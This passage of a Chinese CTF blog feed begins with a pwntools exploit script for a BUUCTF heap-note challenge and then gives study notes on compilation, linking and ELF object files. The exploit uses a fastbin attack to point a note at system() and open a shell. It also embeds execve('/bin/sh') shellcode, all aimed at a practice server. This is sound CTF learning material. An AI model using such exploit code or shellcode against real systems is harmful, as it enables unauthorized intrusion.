class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27020</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.25")</span></span><br><span class="line"><span class="comment">#p = process("./pwn3.23",env =&#123;"LD_PRELOAD":"./libc-2.232.so"&#125;)</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.25"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(idx,type,value,length=<span class="number">0</span>)</span>:</span></span><br><span class="line">    ru(<span class="string">'CNote &gt; '</span>)</span><br><span class="line">    sl(str(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">'Index &gt; '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Type &gt; '</span>)</span><br><span class="line">    sl(str(type))</span><br><span class="line">    <span class="keyword">if</span> type == <span class="number">1</span>:</span><br><span class="line">        ru(<span class="string">'Value &gt; '</span>)</span><br><span class="line">        sl(str(value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ru(<span class="string">'Length &gt; '</span>)</span><br><span class="line">        sl(str(length))</span><br><span class="line">        ru(<span class="string">'Value &gt; '</span>)</span><br><span class="line">        sl(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'CNote &gt; '</span>)</span><br><span class="line">    sl(str(<span class="number">2</span>))</span><br><span class="line">    ru(<span class="string">'Index &gt; '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">newnote(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x61</span>)<span class="comment">#1</span></span><br><span class="line">newnote(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x41</span>)<span class="comment">#2</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># fastbin attack</span></span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line">newnote(<span class="number">3</span>,<span class="number">2</span>,<span class="string">'sh\x00\x00'</span>+p32(elf.plt[<span class="string">'system'</span>]),<span class="number">0xc</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="V-amp-N2020-公开赛-easyTHeap"><a href="#V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap"></a>[V&amp;N2020 公开赛]easyTHeap</h2><p>四个功能的堆</p><ol><li>add<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180234965.png" alt="image-20210308180234965"></li><li>edit<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180253041.png" alt="image-20210308180253041"></li><li>show<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/../../../Desktop/image-20210308180305916.png" alt="image-20210308180305916"></li><li>del<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180318580.png" alt="image-20210308180318580"></li></ol><p>堆结构</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180214617.png" alt="image-20210308180214617"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;babyheap-0ctf-2017（malloc-hook-onegadget）&quot;&gt;&lt;a href=&quot;#babyheap-0ctf-2017（malloc-hook-onegadget）&quot; class=&quot;headerlink&quot; title=&quot;babyheap_0</summary>
      
    
    
    
    
    <category term="BUU" scheme="https://pz1o.top/tags/BUU/"/>
    
  </entry>
  
  <entry>
    <title>程序员的自我修养</title>
    <link href="https://pz1o.top/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
    <id>https://pz1o.top/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</id>
    <published>2021-02-14T08:54:16.000Z</published>
    <updated>2021-03-03T07:25:15.022Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-编译和链接"><a href="#0x01-编译和链接" class="headerlink" title="0x01 编译和链接"></a>0x01 编译和链接</h1><h2 id="1-被隐藏了的过程"><a href="#1-被隐藏了的过程" class="headerlink" title="1.被隐藏了的过程"></a>1.被隐藏了的过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc a.c</span><br></pre></td></tr></table></figure><blockquote><p>有四个过程</p><p>预处理—&gt;编译—&gt;汇编—&gt;链接</p></blockquote><h3 id="1-1-预编译"><a href="#1-1-预编译" class="headerlink" title="1.1 预编译"></a>1.1 预编译</h3><p>预编译主要来处理那些源代码文件中的以”#”开头的预编译指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -E a.c -o a.i</span><br><span class="line">cpp a.c &gt; a.i</span><br></pre></td></tr></table></figure><h3 id="1-2-编译"><a href="#1-2-编译" class="headerlink" title="1.2 编译"></a>1.2 编译</h3><p>编译就是把预处理完的文件转化成相应的汇编代码文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S a.i -o a.s</span><br></pre></td></tr></table></figure><blockquote><p>c编译器使用cc1</p><p>c++是cc1plus</p></blockquote><h3 id="1-3-汇编"><a href="#1-3-汇编" class="headerlink" title="1.3 汇编"></a>1.3 汇编</h3><p>汇编器是将汇编代码转变成机器可执行的指令</p><p>简单来说就是翻译，将汇编代码与机器指令一一对照翻译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">as a.s -o a.o</span><br><span class="line">gcc -c a.s -o a.o</span><br></pre></td></tr></table></figure><blockquote><p>汇编器是as</p></blockquote><p>从源文件开始，预编译，编译，汇编输出的文件叫做目标文件。</p><h3 id="1-4-链接"><a href="#1-4-链接" class="headerlink" title="1.4 链接"></a>1.4 链接</h3><p>链接可以说是最难以理解的一个过程</p><p>接下来会说</p><h2 id="2-编译器在做什么"><a href="#2-编译器在做什么" class="headerlink" title="2.编译器在做什么"></a>2.编译器在做什么</h2><p>也就是上面我们说的第二步</p><p>它通常有6个过程</p><ol><li>扫描</li><li>语法分析</li><li>语义分析</li><li>源代码优化</li><li>代码生成</li><li>目标代码优化</li></ol><h3 id="2-1-词法分析"><a href="#2-1-词法分析" class="headerlink" title="2.1 词法分析"></a>2.1 词法分析</h3><p>首先源代码会被输入到扫描器中，扫描器简单地进行词法分析，运用一种类似于<strong>有限状态机</strong>地算法将源代码地字符序列分割成一系列地记号。</p><p>记号一般为：关键字、识别符、字面量（数字和字符串等）和特殊符号（加号和等号）。</p><h3 id="2-2-语法分析"><a href="#2-2-语法分析" class="headerlink" title="2.2 语法分析"></a>2.2 语法分析</h3><p><strong>语法分析器</strong>将对由扫描器产生的记号进行语法分析，<strong>从而产生语法树</strong></p><p>简单来说，语法分析器产生的语法树就是以<strong>表达式</strong>为节点的树</p><p>具体图可以看书</p><h3 id="2-3-语义分析"><a href="#2-3-语义分析" class="headerlink" title="2.3 语义分析"></a>2.3 语义分析</h3><p><strong>语义分析器</strong>进行语义分析</p><p>编译器所能分析的只是<strong>静态语义</strong>，与之所对应的<strong>动态语义</strong>，只有在运行过程中才可以确定</p><p>静态语义通常包括声明和类型的匹配，类型转换。</p><p>例如将浮点数赋值给指针很明显就是类型不匹配的。</p><p>经过语义分析之后，语法树上的表达式会被标识类型。</p><h3 id="2-4-中间语言生成"><a href="#2-4-中间语言生成" class="headerlink" title="2.4 中间语言生成"></a>2.4 中间语言生成</h3><p><strong>源码级优化器</strong>在不同编译器中会有所差别。</p><p>但作用是一样的，都是将整个语法树转换成中间代码。</p><p>中间代码·使得编译器生成前端和后端。前端负责产生机器无关的中间代码，编译器后端将中间代码转换成目标机器代码。</p><h3 id="2-5-目标代码生成与优化"><a href="#2-5-目标代码生成与优化" class="headerlink" title="2.5 目标代码生成与优化"></a>2.5 目标代码生成与优化</h3><p>编译器后端主要包括<strong>代码生成器</strong>和<strong>目标代码优化器</strong></p><p>代码生成器：将中间代码转换成机器代码，不同机器的不同字长、寄存器、整数数据类型、浮点数数据类型都会影响代码生成器。</p><p>我们经过以上步骤生成的代码全都是<strong>未经链接的目标代码</strong>，最终都需要通过链接器将目标文件链接起来产生可执行文件。</p><h2 id="3-链接器"><a href="#3-链接器" class="headerlink" title="3.链接器"></a>3.链接器</h2><p><strong>重定位</strong>：重新计算各个目标地址过程</p><p><strong>符号</strong>：用来表示一个地址，可能是一段子程序的起始地址，或一个变量的起始地址</p><h2 id="4-静态链接"><a href="#4-静态链接" class="headerlink" title="4.静态链接"></a>4.静态链接</h2><p>每个源码独立地编译，然后按照需要将他们组装起来，组装模块的过程叫做<strong>链接</strong>。</p><p>链接过程包括<strong>地址空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重定位（Relocation）</strong></p><blockquote><p>符号决议和符号绑定大体是差不多的，但决议用于静态链接，绑定用于动态链接</p></blockquote><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207155541582.png" alt="image-20210207155541582"></p><p>如图所示，源代码文件编译成目标文件，<strong>目标文件和库一起链接成可执行文件</strong>。</p><blockquote><p>举个例子</p><p>在main.c中需要其他模块fun.c中的foo()</p><p>所以我们在main.c中每一处调用foo的时候都必须知道foo这个函数的地址，但由于是单独编译的</p><p>我们并不知道这个地址，若无链接器，我们需要手动修正地址</p><p>通过链接器我们可以直接引用foo而无需知道它的地址，因为链接器在链接的时候，会根据所引用的符号foo，自动去相应的模块查找foo的地址，并将main中foo的地址重新修正</p></blockquote><h1 id="0x02-目标文件"><a href="#0x02-目标文件" class="headerlink" title="0x02 目标文件"></a>0x02 目标文件</h1><p>我们上面已经知道源代码经过预处理，编译，汇编产生的文件就叫<strong>目标文件</strong>。</p><p>目标文件其实是已经编译后的可执行文件，只是有些符号和地址未被调整，本身就是按照可执行文件格式存储的，但和真正可执行文件还有所不同。</p><p>可以先来看一下</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207161220722.png" alt="image-20210207161220722"></p><p>下面我们将讲这个文件到底是什么</p><h2 id="1-目标文件的格式"><a href="#1-目标文件的格式" class="headerlink" title="1.目标文件的格式"></a>1.目标文件的格式</h2><p>我们熟知的windows下的PE（Portable Executable）和Linux的ELF（Executable Linkable Format）的是可执行文件</p><p>目标文件就是源代码编译后但未进行链接的中间文件。它与可执行文件的内容和结构很相似，所以一般跟可执行文件格式一起用一种格式存储。</p><p>此外，还有其他可执行文件格式OMF（Object Module Format）和Unix a.out格式和MS-DOS.COM格式等。</p><p><strong>动态链接库</strong>（Dynamic Linking Library）（windows下的dll和linux中的so）及<strong>静态链接库</strong>（Static Linking Libary）（windows下的lib和Linux中的a）都按照可执行文件格式存储</p><p>静态链接库是一个包含有很多目标文件的文件包</p><p>文件格式如下</p><div class="table-container"><table><thead><tr><th style="text-align:left">ELF文件类型</th><th>说明</th><th>实例</th></tr></thead><tbody><tr><td style="text-align:left">重定位文件(Relocatable File)</td><td>包含代码和数据，可以被链接成可执行文件或目标文件</td><td>Linux中.o Win下的obj</td></tr><tr><td style="text-align:left">可执行文件(Executable File)</td><td>可以执行的程序,通常无扩展名</td><td>Linux中.out Win下的.exe</td></tr><tr><td style="text-align:left">共享目标文件(Shared Object File)</td><td>包含代码和数据，有两种情况。第一种是链接器可以使用这种文件跟其他的重定位文件和共享目标文件进行链接产生<strong>新的目标文件</strong>。第二种事动态链接器可以将几个共享目标文件与可执行文件结合，作为进程映像的一部分来运行</td><td>Linux中.so和Win中DLL</td></tr><tr><td style="text-align:left">核心转储文件(Core Dump File)</td><td>当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其他信息转储到核心转储文件</td><td>Linux中的Core Dump</td></tr></tbody></table></div><blockquote><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208204903438.png" alt="image-20210208204903438"></p></blockquote><h2 id="2-目标文件是什么样的"><a href="#2-目标文件是什么样的" class="headerlink" title="2.目标文件是什么样的"></a>2.目标文件是什么样的</h2><p>目标文件除了机器指令代码、数据，还包括了链接时所需要的一些信息，比如符号表、调试信息和符号串等。</p><p>目标文件通常将这些信息按不同的属性，以<strong>节</strong>（Section）来存储，也叫<strong>段</strong>（Segment）</p><p>我们熟知的代码段、数据段就是这个东西</p><p><strong>代码段</strong>存储代码叫<code>.code</code>或<code>.text</code></p><p><strong>数据段</strong>存储全局变量和局部静态变量叫<code>.data</code></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208205643721.png" alt="image-20210208205643721"></p><blockquote><p>从这个图中可以看到，ELF文件的开头是一个文件头，<strong>它描述了整个文件的文件属性，包括文件是否可执行、是静态链接还是动态链接、目标硬件、目标操作系统等各种信息</strong></p><p>此外，文件头还有一个<strong>段表</strong>，</p><p>段表是一个描述<strong>文件中各个段的数组</strong>。段表描述了文件中各个段在文件中的偏移位置以及段的属性等，从段里面可以得到每个段的所有信息。</p><p>文件头之后就是各个段的内容</p></blockquote><p><code>.text</code>：存储c语言编译后的执行语句编译成的机器代码</p><p><code>.data</code>：存储已初始化的全局变量和局部静态变量</p><p><code>.bss</code>：存储未初始化的全局变量和局部静态变量</p><blockquote><p>那么为什么要设置bss段呢？</p><p>在程序中，未初始化的变量是0，如果把他们放在data段并分配空间赋值0是完全浪费空间的一种做法，</p><p>所以可执行文件为了记录所有未初始化的全局变量和局部静态变量的大小总和，记做bss段</p><p><strong>bss段只是为未初始化的全局变量和局部静态变量预留位置而已，并没有内容，在文件中也不占空间</strong></p></blockquote><p><strong>总体来说，程序源代码被编译以后主要分成两种段：程序指令和程序数据。代码段属于程序指令，而数据段和bss段属于程序数据。</strong></p><h2 id="3-挖掘SimpleSection-o"><a href="#3-挖掘SimpleSection-o" class="headerlink" title="3.挖掘SimpleSection.o"></a>3.挖掘SimpleSection.o</h2><p>这里我们换成a.o</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="keyword">int</span> global_uninit_var;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> static_var = <span class="number">85</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> static_var2;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line">func1(static_var + static_var2 + a + b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一下</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209161901015.png" alt="image-20210209161901015"></p><p>现在我们来具体分析一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -h a.o</span><br><span class="line">&#x2F;&#x2F;-h将基本信息打印出来</span><br><span class="line">&#x2F;&#x2F;-x打印更多信息</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209162052499.png" alt="image-20210209162052499"></p><blockquote><p>代码段，数据段，bss段我们已经知道了</p><p>可以看到还有<strong>只读数据段</strong><code>.rodata</code> <strong>注释段</strong><code>.comment</code> <strong>堆栈提示段</strong><code>.note.GNU-stack</code>段</p><p>下面第二行CONTENTS ALLOC表示段的各种属性，CONTENTS表示该段在文件中存在</p><p>看到BSS段是没有CONTENTS表示它实际在ELF文件中不存在内容</p><p>下面我们就来看一下各个段的分布</p></blockquote><p>这里和书上不同的是<code>.note.GNU-stack</code>占了内容，那么我们也把他写上</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209163804417.png" alt="image-20210209163804417"></p><h3 id="3-1-代码段"><a href="#3-1-代码段" class="headerlink" title="3.1 代码段"></a>3.1 代码段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s -d a.o</span><br><span class="line">&#x2F;&#x2F;-s 将段内容按照16进制打印</span><br><span class="line">&#x2F;&#x2F;-d 可以将所有包含指令的段反汇编</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">a.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 5589e583 ec0883ec 08ff7508 68000000  U.........u.h...</span><br><span class="line"> 0010 00e8fcff ffff83c4 1090c9c3 8d4c2404  .............L$.</span><br><span class="line"> 0020 83e4f0ff 71fc5589 e55183ec 14c745f0  ....q.U..Q....E.</span><br><span class="line"> 0030 01000000 8b150400 0000a100 00000001  ................</span><br><span class="line"> 0040 c28b45f0 01c28b45 f401d083 ec0c50e8  ..E....E......P.</span><br><span class="line"> 0050 fcffffff 83c410b8 00000000 8b4dfcc9  .............M..</span><br><span class="line"> 0060 8d61fcc3                             .a..            </span><br><span class="line">Contents of section .data:</span><br><span class="line"> 0000 54000000 55000000                    T...U...        </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 25640a00                             %d..            </span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202855 62756e74 7520352e  .GCC: (Ubuntu 5.</span><br><span class="line"> 0010 342e302d 36756275 6e747531 7e31362e  4.0-6ubuntu1~16.</span><br><span class="line"> 0020 30342e31 32292035 2e342e30 20323031  04.12) 5.4.0 201</span><br><span class="line"> 0030 36303630 3900                        60609.          </span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 017c0801  .........zR..|..</span><br><span class="line"> 0010 1b0c0404 88010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 1c000000 00410e08 8502420d  .........A....B.</span><br><span class="line"> 0030 0558c50c 04040000 28000000 3c000000  .X......(...&lt;...</span><br><span class="line"> 0040 1c000000 48000000 00440c01 00471005  ....H....D...G..</span><br><span class="line"> 0050 02750043 0f03757c 06750c01 0041c543  .u.C..u|.u...A.C</span><br><span class="line"> 0060 0c040400                             ....            </span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;func1&gt;:</span><br><span class="line">   0:55                   push   %ebp</span><br><span class="line">   1:89 e5                mov    %esp,%ebp</span><br><span class="line">   3:83 ec 08             sub    $0x8,%esp</span><br><span class="line">   6:83 ec 08             sub    $0x8,%esp</span><br><span class="line">   9:ff 75 08             pushl  0x8(%ebp)</span><br><span class="line">   c:68 00 00 00 00       push   $0x0</span><br><span class="line">  11:e8 fc ff ff ff       call   12 &lt;func1+0x12&gt;</span><br><span class="line">  16:83 c4 10             add    $0x10,%esp</span><br><span class="line">  19:90                   nop</span><br><span class="line">  1a:c9                   leave  </span><br><span class="line">  1b:c3                   ret    </span><br><span class="line"></span><br><span class="line">0000001c &lt;main&gt;:</span><br><span class="line">  1c:8d 4c 24 04          lea    0x4(%esp),%ecx</span><br><span class="line">  20:83 e4 f0             and    $0xfffffff0,%esp</span><br><span class="line">  23:ff 71 fc             pushl  -0x4(%ecx)</span><br><span class="line">  26:55                   push   %ebp</span><br><span class="line">  27:89 e5                mov    %esp,%ebp</span><br><span class="line">  29:51                   push   %ecx</span><br><span class="line">  2a:83 ec 14             sub    $0x14,%esp</span><br><span class="line">  2d:c7 45 f0 01 00 00 00 movl   $0x1,-0x10(%ebp)</span><br><span class="line">  34:8b 15 04 00 00 00    mov    0x4,%edx</span><br><span class="line">  3a:a1 00 00 00 00       mov    0x0,%eax</span><br><span class="line">  3f:01 c2                add    %eax,%edx</span><br><span class="line">  41:8b 45 f0             mov    -0x10(%ebp),%eax</span><br><span class="line">  44:01 c2                add    %eax,%edx</span><br><span class="line">  46:8b 45 f4             mov    -0xc(%ebp),%eax</span><br><span class="line">  49:01 d0                add    %edx,%eax</span><br><span class="line">  4b:83 ec 0c             sub    $0xc,%esp</span><br><span class="line">  4e:50                   push   %eax</span><br><span class="line">  4f:e8 fc ff ff ff       call   50 &lt;main+0x34&gt;</span><br><span class="line">  54:83 c4 10             add    $0x10,%esp</span><br><span class="line">  57:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  5c:8b 4d fc             mov    -0x4(%ebp),%ecx</span><br><span class="line">  5f:c9                   leave  </span><br><span class="line">  60:8d 61 fc             lea    -0x4(%ecx),%esp</span><br><span class="line">  63:c3                   ret</span><br></pre></td></tr></table></figure><blockquote><p>通过上面这段代码</p><p>我们对文件内容有了更深入的了解</p><p>最左面是偏移量，中间是16进制内容，右面是ascii形式</p><p>反汇编结果我们也很熟悉</p></blockquote><h3 id="3-2-数据段和只读数据段"><a href="#3-2-数据段和只读数据段" class="headerlink" title="3.2 数据段和只读数据段"></a>3.2 数据段和只读数据段</h3><p><code>.data</code>段保存<strong>已经初始化了的全局静态变量和局部静态变量</strong>,所以上面程序中<code>.data</code>是八个字节</p><p><code>.rodata</code>存放只读数据，一般是程序里面的只读变量和字符串常量，例如上面中<code>printf</code>的参数<code>%d\n\0</code>是四个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Contents of section .data:</span><br><span class="line"> 0000 54000000 55000000                    T...U...        </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 25640a00                             %d..</span><br></pre></td></tr></table></figure><blockquote><p>也可以看出<code>.data</code>是84 85从低到高是0x54 0x00 0x00 0x00</p><p><code>.rodata</code>是%d\n\0</p></blockquote><h3 id="3-3-BSS段"><a href="#3-3-BSS段" class="headerlink" title="3.3 BSS段"></a>3.3 BSS段</h3><p><code>.bss</code>段存储<strong>未初始化的全局变量和局部静态变量</strong>。</p><h3 id="3-4-其他段"><a href="#3-4-其他段" class="headerlink" title="3.4 其他段"></a>3.4 其他段</h3><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210140348425.png" alt="image-20210210140348425"></p><p>这些段都是由.来做前缀，说明这些表的名字是系统保留的。我们可以自定义段名，并在文件中插入这个段，达到自己想干的事情。</p><blockquote><p>将一个二进制文件如图片，音乐作为目标文件的一个段</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objcopy -I binary -O elf32-i386 -B i386 image.jpg image.o</span><br><span class="line">objdump -ht image.o</span><br></pre></td></tr></table></figure><h2 id="4-ELF文件结构描述"><a href="#4-ELF文件结构描述" class="headerlink" title="4.ELF文件结构描述"></a>4.ELF文件结构描述</h2><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141207866.png" alt="image-20210210141207866"></p><p>ELF目标文件格式最前面是<strong>ELF文件头</strong>，包含整个文件的基本属性，如ELF文件版本、目标机器型号、程序入口地址等。</p><p>在ELF文件中与段有关的重要结构就是段表(Section Hearder 